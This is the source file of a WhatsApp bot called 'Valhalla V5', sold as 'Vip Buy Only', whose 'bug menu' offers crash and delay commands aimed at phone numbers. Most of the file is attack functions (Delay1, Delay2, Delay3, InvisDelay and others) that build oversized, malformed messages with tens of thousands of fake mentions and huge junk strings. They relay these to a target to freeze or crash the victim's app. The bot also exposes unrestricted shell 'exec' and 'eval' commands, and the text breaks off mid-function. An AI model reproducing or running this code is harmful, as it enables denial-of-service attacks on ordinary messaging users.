/*─────────────────────────────────────────
  GitHub   : https://github.com/ErlanggaaXzzz    
  YouTube  : https://youtube.com/@ErlanggaOfficial-t2z
  Telegram : https://t.me/langgxyz2
──────────────────────────────────────────*/

const config = require('./settings/config');
const fs = require('fs');
const axios = require('axios');
const chalk = require("chalk");
const jimp = require("jimp")
const util = require("util");
const crypto  = require("crypto")
const fetch = require("node-fetch")
const moment = require("moment-timezone");
const path = require("path")
const os = require('os');
const speed = require('performance-now')
const { Sticker } = require("wa-sticker-formatter");
const { spawn, exec, execSync } = require('child_process');
const { 
  default: baileys, proto, jidNormalizedUser, generateWAMessage, 
  generateWAMessageFromContent, getContentType, prepareWAMessageMedia 
} = require("baileys-erlangga");

const {
  downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, 
  generateWAMessageContent, makeInMemoryStore, MediaType, areJidsSameUser, 
  WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, 
  GroupMetadata, initInMemoryKeyStore, MiscMessageGenerationOptions, 
  useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, 
  WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, 
  WALocationMessage, WAContextInfo, WAGroupMetadata, ProxyAgent, 
  waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, 
  WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, 
  WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, 
  MediariyuInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, 
  WAMediaUpload, mentionedJid, processTime, Browser, MessageType, 
  Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, 
  GroupSettingChange, DisriyuectReason, WASocket, getStream, WAProto, 
  isBaileys, AnyMessageContent, fetchLatestBaileysVersion, 
  templateMessage, InteractiveMessage, Header 
} = require("baileys-erlangga");
module.exports = langgxyz = async (langgxyz, m, chatUpdate, store) => {
    try {
        const body = (
            m.mtype === "conversation" ? m.message.conversation :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
            m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId ||
            m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
        );
        
        const sender = m.key.fromMe ? langgxyz.user.id.split(":")[0] + "@s.whatsapp.net" ||
              langgxyz.user.id : m.key.participant || m.key.remoteJid;
        
        const senderNumber = sender.split('@')[0];
        const budy = (typeof m.text === 'string' ? m.text : '');
        const prefa = ["", "!", ".", ",", "🐤", "🗿"];

        const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
        const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
        const from = m.key.remoteJid;
        const isGroup = from.endsWith("@g.us");
        const botNumber = await langgxyz.decodeJid(langgxyz.user.id);
        const isBot = botNumber.includes(senderNumber)
        
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const command2 = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        const text = q = args.join(" ");
        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);
        const premium = JSON.parse(fs.readFileSync("./gudang/lib/database/premium.json"));
       const creator = JSON.parse(fs.readFileSync('./gudang/lib/database/owner.json'));
       const isPremium = premium.includes(m.sender);
       const isCreator = [botNumber, ...creator, ...config.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
        const { smsg, fetchJson, sleep, formatSize, runtime } = require('./gudang/lib/myfunction');     
        const cihuy = fs.readFileSync('./gudang/lib/media/thumbnail.jpg')
       const Memek = fs.readFileSync("./gudang/lib/media/thumbnail2.jpg")
        const { fquoted } = require('./gudang/lib/fquoted')
        
        if (isBot) {
            console.log('\x1b[30m--------------------\x1b[0m');
            console.log(chalk.bgHex("#4a69bd").bold(`▢ New Message`));
            console.log(
                chalk.bgHex("#ffffff").black(
                    `   ▢ Tanggal: ${new Date().toLocaleString()} \n` +
                    `   ▢ Pesan: ${m.body || m.mtype} \n` +
                    `   ▢ Pengirim: ${pushname} \n` +
                    `   ▢ JID: ${senderNumber}`
                )
            );
            console.log();
        }
        
        const reaction = async (jidss, emoji) => {
            langgxyz.sendMessage(jidss, {
                react: {
                    text: emoji,
                    key: m.key 
                } 
            })
        };
        
        async function reply(text) {
            langgxyz.sendMessage(m.chat, {
                text: "\n" + text + "\n",
                contextInfo: {
                    mentionedJid: [sender],
                    externalAdReply: {
                        title: "Valhalla V5",
                        body: "RannOfficial",
                        thumbnailUrl: "https://files.catbox.moe/z3t3do.jpg",
                        sourceUrl: "https://t.me/rannloww",
                        renderLargerThumbnail: false,
                    }
                }
            }, { quoted: fquoted.packSticker })
        }
        
        const pluginsLoader = async (directory) => {
            let plugins = [];
            const folders = fs.readdirSync(directory);
            folders.forEach(file => {
                const filePath = path.join(directory, file);
                if (filePath.endsWith(".js")) {
                    try {
                        const resolvedPath = require.resolve(filePath);
                        if (require.cache[resolvedPath]) {
                            delete require.cache[resolvedPath];
                        }
                        const plugin = require(filePath);
                        plugins.push(plugin);
                    } catch (error) {
                        console.log(`${filePath}:`, error);
                    }
                }
            });
            return plugins;
        };

        const pluginsDisable = true;
        const plugins = await pluginsLoader(path.resolve(__dirname, "./command"));
        const plug = {
            langgxyz,
            prefix,
            command, 
            reply, 
            text, 
            isBot,
            reaction,
            pushname, 
            mime,
            quoted,
            sleep,
            fquoted,
            fetchJson 
        };

        for (let plugin of plugins) {
            if (plugin.command.find(e => e == command.toLowerCase())) {
                if (plugin.isBot && !isBot) {
                    return
                }
                
                if (plugin.private && !plug.isPrivate) {
                    return m.reply(config.message.private);
                }

                if (typeof plugin !== "function") return;
                await plugin(m, plug);
            }
        }
        
        if (!pluginsDisable) return;  



        switch (command) {
            
            case "menu":{
                const totalMem = os.totalmem();
                const freeMem = os.freemem();
                const usedMem = totalMem - freeMem;
                const formattedUsedMem = formatSize(usedMem);
                const formattedTotalMem = formatSize(totalMem);
                let timestamp = speed()
                let latensi = speed() - timestamp
                let menu = `
🦅 — ( 𝘳𝘢𝘯𝘯𝘰𝘧𝘧𝘪𝘤𝘪𝘢𝘭 )
𝘭𝘢𝘶𝘵𝘢𝘯 𝘪𝘵𝘶 𝘥𝘢𝘭𝘢𝘮, 𝘵𝘦𝘳𝘪𝘮𝘢𝘬𝘢𝘴𝘪𝘩 𝘵𝘦𝘭𝘢𝘩
𝘮𝘦𝘯𝘪𝘭𝘢𝘪𝘬𝘶 𝘥𝘢𝘳𝘪 𝘱𝘦𝘳𝘮𝘶𝘬𝘢𝘢𝘯, 𝘢𝘬𝘢𝘯 𝘬𝘶
𝘣𝘶𝘬𝘵𝘪𝘬𝘢𝘯 𝘥𝘪 𝘩𝘢𝘳𝘪 𝘱𝘦𝘮𝘣𝘶𝘬𝘵𝘪𝘢𝘯

\`╔═══[ BOT STATUS ]════\`
\`║\` ✰ Name Bot : Valhalla
\`║\` ✰ Version : 5.0
\`║\` ✰ Developer : Rannloww
\`║\` ✰ Status : Vip Buy Only
\`╚═════════════════════\`

\`╔═══[  COMMANDS ]═══\`
\`║\` ✰ .bugmenu
\`║\` ✰ .ownermenu
\`║\` ✰ .mtbanned
\`╚═══════════════════════\`
`
                await langgxyz.sendMessage(m.chat, {
                    productMessage: {
                        title: "Valhalla",
                        description: "Valhalla Created By RannOfficial",
                        thumbnail: "https://files.catbox.moe/z3t3do.jpg",
                        productId: "123456789",
                        retailerId: "TOKOKU",
                        url: "https://t.me/rannloww",
                        body: menu,
                        footer: "RannOfficial",
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "Najay"
                                })
                            },
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "K",
                                    url: "https://t.me/rannloww"
                                })
                            }
                        ]
                    }
                }, { quoted: fquoted.packSticker });
            }
            break
            case "get":{
                if (!isBot) return
                if (!/^https?:\/\//.test(text)) return reply(`*ex:* ${prefix + command} https://ErlanggaOfficial.site`);
                const ajg = await fetch(text);
                await reaction(m.chat, "⚡")
                
                if (ajg.headers.get("content-length") > 100 * 1024 * 1024) {
                    throw `Content-Length: ${ajg.headers.get("content-length")}`;
                }

                const contentType = ajg.headers.get("content-type");
                if (contentType.startsWith("image/")) {
                    return langgxyz.sendMessage(m.chat, {
                        image: { url: text }
                    }, { quoted: fquoted.packSticker });
                }
        
                if (contentType.startsWith("video/")) {
                    return langgxyz.sendMessage(m.chat, {
                        video: { url: text } 
                    }, { quoted: fquoted.packSticker });
                }
                
                if (contentType.startsWith("audio/")) {
                    return langgxyz.sendMessage(m.chat, {
                        audio: { url: text },
                        mimetype: 'audio/mpeg', 
                        ptt: true
                    }, { quoted: fquoted.packSticker });
                }
        
                let alak = await ajg.buffer();
                try {
                    alak = util.format(JSON.parse(alak + ""));
                } catch (e) {
                    alak = alak + "";
                } finally {
                    return reply(alak.slice(0, 65536));
                }
            }
            break
            case "insp": {
                if (!isBot) return
                if (!text && !m.quoted) return reply(`*reply:* ${prefix + command}`);
                let quotedType = m.quoted?.mtype || '';
                let penis = JSON.stringify({ [quotedType]: m.quoted }, null, 2);
                const acak = `insp-${crypto.randomBytes(6).toString('hex')}.json`;
                
                await langgxyz.sendMessage(m.chat, {
                    document: Buffer.from(penis),
                    fileName: acak,
                    mimetype: "application/json"
                }, { quoted: fquoted.packSticker })
            }
            break
            case 'tagall':{
                if (!isBot) return
                const textMessage = args.join(" ") || "nothing";
                let teks = `tagall message :\n> *${textMessage}*\n\n`;
                const groupMetadata = await langgxyz.groupMetadata(m.chat);
                const participants = groupMetadata.participants;
                for (let mem of participants) {
                    teks += `@${mem.id.split("@")[0]}\n`;
                }

                langgxyz.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map((a) => a.id)
                }, { quoted: fquoted.packSticker });
            }
            break
            case "exec": {
                if (!isBot) return;
                if (!budy.startsWith(".exec")) return;
                
                const { exec } = require("child_process");
                const args = budy.trim().split(' ').slice(1).join(' ');
                if (!args) return reply(`*ex:* ${prefix + command} ls`);
                exec(args, (err, stdout) => {
                    if (err) return reply(String(err));
                    if (stdout) return reply(stdout);
                });
            }
            break;
            case "eval": {
                if (!isBot) return;
                if (!budy.startsWith(".eval")) return;
                
                const args = budy.trim().split(' ').slice(1).join(' ');
                if (!args) return reply(`*ex:* ${prefix + command} m.chat`);
                let teks;
                try {
                    teks = await eval(`(async () => { ${args.startsWith("return") ? "" : "return"} ${args} })()`);
                } catch (e) {
                    teks = e;
                } finally {
                    await reply(require('util').format(teks));
                }
            }
            break;
            case "bugmenu":{
            let mbut = `
🦅 — ( 𝘳𝘢𝘯𝘯𝘰𝘧𝘧𝘪𝘤𝘪𝘢𝘭 )
𝘭𝘢𝘶𝘵𝘢𝘯 𝘪𝘵𝘶 𝘥𝘢𝘭𝘢𝘮, 𝘵𝘦𝘳𝘪𝘮𝘢𝘬𝘢𝘴𝘪𝘩 𝘵𝘦𝘭𝘢𝘩
𝘮𝘦𝘯𝘪𝘭𝘢𝘪𝘬𝘶 𝘥𝘢𝘳𝘪 𝘱𝘦𝘳𝘮𝘶𝘬𝘢𝘢𝘯, 𝘢𝘬𝘢𝘯 𝘬𝘶
𝘣𝘶𝘬𝘵𝘪𝘬𝘢𝘯 𝘥𝘪 𝘩𝘢𝘳𝘪 𝘱𝘦𝘮𝘣𝘶𝘬𝘵𝘪𝘢𝘯

\`╔═══[ BOT STATUS ]════\`
\`║\` ✰ Name Bot : Valhalla
\`║\` ✰ Version : 5.0
\`║\` ✰ Developer : Rannloww
\`║\` ✰ Status : Vip Buy Only
\`╚═════════════════════\`

\`╭━( BUG MENU )\`
\`┃\` ✰ /ᴄʀᴀsʜʙᴇᴛᴀ 62×××
\`┃\` ✰ /ᴄʀᴀsʜɪᴏs 62×××
\`┃\` ✰ /ɪɴᴠɪsᴅᴇʟᴀʏ 62×××
\`┃\` ✰ /ᴅᴇʟᴀʏ24ᴊᴍ 62×××
\`┃\` ✰ /ʀᴀɴɴɪʜᴅᴇᴋ 62×××
\`┃\` ✰ /ʙᴜsɪɴɴᴇs 62×××
\`┃\` ✰ /ᴄʀᴀsʜɢʀᴏᴜᴘ 62×××
\`┃\` ✰ /ɢʀᴏᴜᴘsᴀᴍᴘᴀʜ 62×××
\`╰━━━━━━━━━━━━━━━━━━༉\`

`;
langgxyz.sendMessage(m.chat, {
  image: Memek,
  caption: mbut,
  footer: "Developer Rann",
  contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `Valhalla V5`,
            "body": `© Rann Developer`,
            "previewType": "PHOTO",
            "thumbnailUrl": `youtube.com/@Erlangga Official`,
           "thumbnail": cihuy,
            "sourceUrl": `https://whatsapp.com/channel/0029VaycTF0JkK7A95txZi0d`
        }
    },
 buttons: [
     {
    buttonId: ".tqto", 
    buttonText: { 
      displayText: '𝐓𝐐𝐓𝐎' 
    }
  }, {
    buttonId: ".menu", 
    buttonText: {
      displayText: "𝐁𝐀𝐂𝐊"
    }
  },
     {
    buttonId: ".ownermenu", 
    buttonText: {
      displayText: "𝐒𝐇𝐎𝐖 𝐀𝐂𝐂𝐄𝐒"
    }
  }
],
  viewOnce: true,
  headerType: 6
}, { quoted: fquoted.packSticker })
}
break
case 'ownermenu':{
let mbut = `

\`╔═══[ BOT STATUS ]════\`
\`║\` ✰ Name Bot : Valhalla
\`║\` ✰ Version : 5.0
\`║\` ✰ Developer : Rannloww
\`║\` ✰ Status : Vip Buy Only
\`╚═════════════════════\`

\`╭━( OWNER MENU )\`
\`┃\` ✰ /ᴀᴅᴅᴍᴜʀʙᴜɢ
\`┃\` ✰ /ᴅᴇʟʟᴍᴜʀʙᴜɢ
\`┃\` ✰ /sᴇʟғ
\`┃\` ✰ /ᴘᴜʙʟɪᴄ
\`╰━━━━━━━━━━━━━━━━━━༉\`

`;
langgxyz.sendMessage(m.chat, {
  image: Memek,
  caption: mbut,
  footer: "Developer Rann",
  contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `Valhalla V5`,
            "body": `© Rann Developer`,
            "previewType": "PHOTO",
            "thumbnailUrl": `youtube.com/@Erlangga Official`,
           "thumbnail": cihuy,
            "sourceUrl": `https://whatsapp.com/channel/0029VaycTF0JkK7A95txZi0d`
        }
    },
 buttons: [
     {
    buttonId: ".tqto", 
    buttonText: { 
      displayText: '𝐓𝐐𝐓𝐎' 
    }
  }, {
    buttonId: ".menu", 
    buttonText: {
      displayText: "𝐁𝐀𝐂𝐊"
    }
  },
     {
    buttonId: ".bugmenu", 
    buttonText: {
      displayText: "𝐒𝐇𝐎𝐖 BUG MENU"
    }
  }
],
  viewOnce: true,
  headerType: 6
}, { quoted: fquoted.packSticker })
}
break
case 'tqto': {
let buy = `
\`╭━──━ ❖ TANKS TO ❖\`
\`┃\` ✰ DEVELOPER : @rannloww
\`┃\` ✰ SUPPORT : @Gabrieltzyproooool
\`┃\` ✰ SUPPORT : @langgxyz2
\`┃\` ✰ SUPPORT : @takashi
\`┃\` ✰ PARTNER : @rafaxy
\`┃\` ✰ PARTNER : @kenXiter
\`┃\` ✰ PARTNER : @depaynika
\`┃\` ✰ PARTNER : @maulofficial
\`┃\` ✰ PARTNER : @sraffofficial
\`┃\` ✰ PARTNER : @kaizi
\`┃\` ✰ PARTNER : @xatanical
\`┃\` ✰ PARTNER : @vampire
\`┃\` ✰ PARTNER : @xenzu
\`┃\` ✰ PARTNER : @XyzYour
\`┃\` ✰ PARTNER : @Nted
\`┃\` ✰ PARTNER : @Xnadddd
\`┃\` ✰ PARTNER : @almas
\`┃\` ✰ PARTNER : @Kayla
\`┃\` ✰ PARTNER : @xlwylubi
\`┃\` ✰ PARTNER : @delion
\`┃\` ✰ PARTNER : @rizfavboy
\`┃\` ✰ PARTNER : @langitsensi
\`┃\` ✰ PARTNER : @GanXyzMods
\`╰━────────────────━❏\`
`
langgxyz.sendMessage(m.chat, {
  image: Memek,
  caption: buy,
  footer: "Developer Rann",
  contextInfo: {
        mentionedJid: [m.sender],
        forwardingScore: 9999999,
        isForwarded: true,
        "externalAdReply": {
            "showAdAttribution": true,
            "containsAutoReply": true,
            "title": `Valhalla V5`,
            "body": `© Rann Developer`,
            "previewType": "PHOTO",
            "thumbnailUrl": `youtube.com/@Erlangga Official`,
            "thumbnail": cihuy,
            "sourceUrl": `https://whatsapp.com/channel/0029VaycTF0JkK7A95txZi0d`
        }
    },
 buttons: [
     {
    buttonId: ".menu", 
    buttonText: {
      displayText: "Kembali"
    }
   }
],
  viewOnce: true,
  headerType: 6
}, { quoted: fquoted.packSticker })
}
break

// Command Owner
case "addmurbug":{
if (!isCreator) return reply("khusus owner bre")
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285179836603`)
let anj = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await langgxyz.onWhatsApp(anj)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
premium.push(anj)
fs.writeFileSync("./gudang/lib/database/premium.json", JSON.stringify(premium))
reply(`Nomor ${anj} Telah Menjadi murbug!`)
}
break

case 'delmurbug': {
    if (!isCreator) return reply("𝐎𝐰𝐧𝐞𝐫 𝐎𝐧𝐥𝐲");
    if (args.length < 1) return reply(`Use :\n*#delmurbug* @tag\n*#delmurbug* number`);

    if (m.mentionedJid.length !== 0) {
        for (let i = 0; i < m.mentionedJid.length; i++) {
            premium.splice(getpremiumPosition(m.mentionedJid[i], premium), 1);
            fs.writeFileSync("./gudang/lib/database/premium.json", JSON.stringify(premium));
        }
        reply("Delete success");
    } else {
        premium.splice(getpremiumPosition(args[0] + "@s.whatsapp.net", premium), 1);
        fs.writeFileSync("./gudang/lib/database/premium.json", JSON.stringify(premium));
        reply("Success");
    }
}
break 
 case "self":{
                if (!isCreator) return reply("`𝐎𝐰𝐧𝐞𝐫 𝐎𝐧𝐥𝐲`") 
                langgxyz.public = false
                reply(`successfully changed to ${command}`)
            }
            break
                        case "public":{
                if (!isCreator) return reply("`𝐎𝐰𝐧𝐞𝐫 𝐎𝐧𝐥𝐲`") 
                langgxyz.public = true
                reply(`successfully changed to ${command}`)
            }
            break
            // Funcbugnya
async function locationinvisinble(isTarget) {
    const generateLocationMessage = {
        viewOnceMessage: {
            message: {
                locationMessage: {
                    degreesLatitude: 0,
                    degreesLongitude: 0,
                    name: "—Rannn",
                    address: "\0",
                    contextInfo: {
                        mentionedJid: Array.from({ length: 1900 }, () =>
                            "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                        ),
                        isSampled: true,
                        participant: isTarget,
                        remoteJid: isTarget,
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const locationMsg = generateWAMessageFromContent(isTarget, generateLocationMessage, {});

    await langgxyz.relayMessage(isTarget, locationMsg.message, {
        messageId: locationMsg.key.id
    });
}
                
async function Delay1(target) {
  try {
    const mentions = Array.from({ length: 40000 }, (_, i) => `${i}@s.whatsapp.net`);
    const corruptedJson = "{".repeat(500000);

    const fakeImage = {
      mimetype: "image/jpeg",
      caption: "",
      fileLength: "9999999999999",
      fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
      fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
      mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
      height: 1,
      width: 1,
      jpegThumbnail: Buffer.from("").toString("base64"),
      contextInfo: {
        mentionedJid: mentions,
        forwardingScore: 9999,
        isForwarded: true,
        participant: "0@s.whatsapp.net"
      }
    };

    const payload = {
      viewOnceMessage: {
        message: {
          imageMessage: fakeImage,
          interactiveMessage: {
            header: {
              title: " ".repeat(6000),
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999,
                degreesLongitude: 999,
                name: corruptedJson.slice(0, 100),
                address: corruptedJson.slice(0, 100)
              }
            },
            body: { text: "⟅ ༑ ▾VALHALAA⟅ ༑ ▾" },
            footer: { text: "🩸 ༑ RANNN⟅ ༑ 🩸" },
            nativeFlowMessage: {
              messageParamsJson: corruptedJson
            },
            contextInfo: {
              mentionedJid: mentions,
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net"
            }
          }
        }
      }
    };

    await langgxyz.relayMessage("status@broadcast", payload, {
      messageId: null,
      statusJidList: [target]
    });

    console.log("Delay 1 Hard Bug Send To Target");
  } catch (err) {
    console.error("❌ Error kirim Delay 1:", err);
  }
}

async function Delay2(target) {
  try {
    const mentions40k = Array.from({ length: 40000 }, (_, i) => `${i}@s.whatsapp.net`);
    const mentions16k = Array.from({ length: 1600 }, () => `${Math.floor(1e11 + Math.random() * 9e11)}@s.whatsapp.net`);
    const corruptedJson = "{".repeat(500000);

    const fakeImage = {
      mimetype: "image/jpeg",
      caption: "",
      fileLength: "9999999999999",
      fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
      fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
      mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
      height: 1,
      width: 1,
      jpegThumbnail: Buffer.from("").toString("base64"),
      contextInfo: {
        mentionedJid: mentions40k,
        forwardingScore: 9999,
        isForwarded: true,
        participant: "0@s.whatsapp.net"
      }
    };

    const comboPayload = {
      viewOnceMessage: {
        message: {
          imageMessage: fakeImage,
          interactiveMessage: {
            header: {
              title: " ".repeat(6000),
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999,
                degreesLongitude: 999,
                name: corruptedJson.slice(0, 100),
                address: corruptedJson.slice(0, 100)
              }
            },
            body: { text: "⟅ ༑ ▾VALHALAA⟅ ༑ ▾" },
            footer: { text: "🩸 ༑ VALHALAA⟅ ༑ 🩸" },
            nativeFlowMessage: {
              messageParamsJson: corruptedJson
            },
            contextInfo: {
              mentionedJid: mentions40k,
              forwardingScore: 9999,
              isForwarded: true,
              participant: "0@s.whatsapp.net"
            }
          },
          conversation: "\u2063".repeat(1000),
          contextInfo: {
            externalAdReply: {
              title: "VALHALLAA",
              body: "Delay 2 Hard Bug",
              thumbnailUrl: "https://files.catbox.moe/nuotqm.jpg",
              mediaType: 1,
              sourceUrl: "https://t.me/rannloww",
              showAdAttribution: false
            },
            mentionedJid: mentions16k
          },
          interactiveResponseMessage: {
            body: { text: "༑ RANNN 炎", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "꧔꧈".repeat(9000),
              version: 3
            }
          }
        }
      },
      nativeFlowMessage: {
        name: "call_permission_request",
        messageParamsJson: "{".repeat(5000) + "[".repeat(5000),
        status: true,
        cameraAccess: true
      }
    };

    const msg = await generateWAMessageFromContent(target, comboPayload, {});

    await langgxyz.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
        }]
      }]
    });

    await langgxyz.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
        }]
      }]
    });

    console.log("DELAY 2 BUG SEND TO TARGET");
  } catch (err) {
    console.error("❌ Error in Delay2:", err);
  }
}

async function Delay3(langgxyz, target) {
    const mentionedJids = Array.from({ length: 1600 }, () => 
        `${Math.floor(1e11 + Math.random() * 9e11)}@s.whatsapp.net`
    );

    let msg;

    for (let i = 0; i < 999999; i++) {
        const msgContent = {
            viewOnceMessage: {
                message: {
                    conversation: "\u2063".repeat(1000),
                    contextInfo: {
                        externalAdReply: {
                            title: "RANNOFFICIAL",
                            body: "Valhalla",
                            thumbnailUrl: "https://files.catbox.moe/nuotqm.jpg",
                            mediaType: 1,
                            sourceUrl: "https://t.me/LuciferNotDev",
                            showAdAttribution: false
                        },
                        mentionedJid: mentionedJids
                    },
                    interactiveResponseMessage: {
                        body: {
                            text: "🩸 ༑ Rannn⟅ ༑ 🩸",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "꧔꧈".repeat(9000),
                            version: 3
                        }
                    }
                }
            },
            nativeFlowMessage: {
                name: "call_permission_request",
                messageParamsJson: "{".repeat(5000) + "[".repeat(5000),
                status: true,
                cameraAccess: true
            }
        };

        msg = await generateWAMessageFromContent(target, msgContent, {});
        await new Promise(resolve => setTimeout(resolve, 300));
    }

    await langgxyz.relayMessage(target, msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    await langgxyz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });
}



 
/*/-------------------------------------------------------------------------------------------------------------------------------------------------------------/*/

/*/ [ FUNCTION TYPE 1 ] /*/

                
async function InvisDelay(target, mention) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/30660994_671452705709185_1216552849572997529_n.enc?ccb=11-4&oh=01_Q5Aa1gEtxyMxg-3KsoTrQJTn_0975yQMi4MrLxKv0Us-Yl2nBg&oe=685F9977&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mpeg",
                    fileSha256: Buffer.from("aP7OzjZYQeT/660AyijlPDU+03vMOl4UJHg6qFU3lOM=", "base64"),
                    fileLength: 99999999999,
                    seconds: 24,
                    ptt: false,
                    mediaKey: Buffer.from("WQfLoSWy9BRY4dykp/MiEvFpgf2Gt+dJFswJ8hoVz6A=", "base64"),
                    fileEncSha256: Buffer.from("03TYnSxt5tzyF42T/K/cpg2DqP3FsQ0rN0u3q31iUMU=", "base64"),
                    directPath: "/v/t62.7114-24/30660994_671452705709185_1216552849572997529_n.enc?ccb=11-4&oh=01_Q5Aa1gEtxyMxg-3KsoTrQJTn_0975yQMi4MrLxKv0Us-Yl2nBg&oe=685F9977&_nc_sid=5e03e0",
                    mediaKeyTimestamp: 1748513902,
                    contextInfo: {
                        mentionedJid: Array.from({ length: 40000 }, () =>
                            "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                        ),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        text: "Rann KILL YOUUඩා" + "ោ៝".repeat(10000),
                        forwardedNewsletterMessageInfo: {
                            newsletterName: "XyzzZz",
                            newsletterJid: "120363309802495518@newsletter",
                            serverMessageId: 1
                        },
                        businessMessageForwardInfo: {
                            businessOwnerJid: "5521992999999@s.whatsapp.net"
                        },
                        nativeFlowResponseMessage: {
                            name: "© Rann",
                            paramsJson: "\u0000".repeat(999999)
                        },
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/13158749_1750335815519895_6021414070433962213_n.enc?ccb=11-4&oh=01_Q5Aa1gE7ilsZ_FF3bjRSDrCYZWbHSHDUUnqhdPHONunoKyqDNQ&oe=685E3E69&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/octet-stream",
                            fileSha256: Buffer.from("4c69bbca7b6396dd6766327cc0b13fc64b97c581442eea626c3919643f3793c4", "hex"),
                            fileEncSha256: Buffer.from("414942a0d3204ae71b4585ae1dedafcc8ad2a14687fa9cbbcde3efb5a4ac86a9", "hex"),
                            fileLength: 99999999999,
                            mediaKey: Buffer.from("4b2d315efbdfea6d69ffdd6ce80ae57fa90ddcd8935b897d85ba29ef15674371", "hex"),
                            fileName: "© Rann",
                            mediaKeyTimestamp: 1748420423,
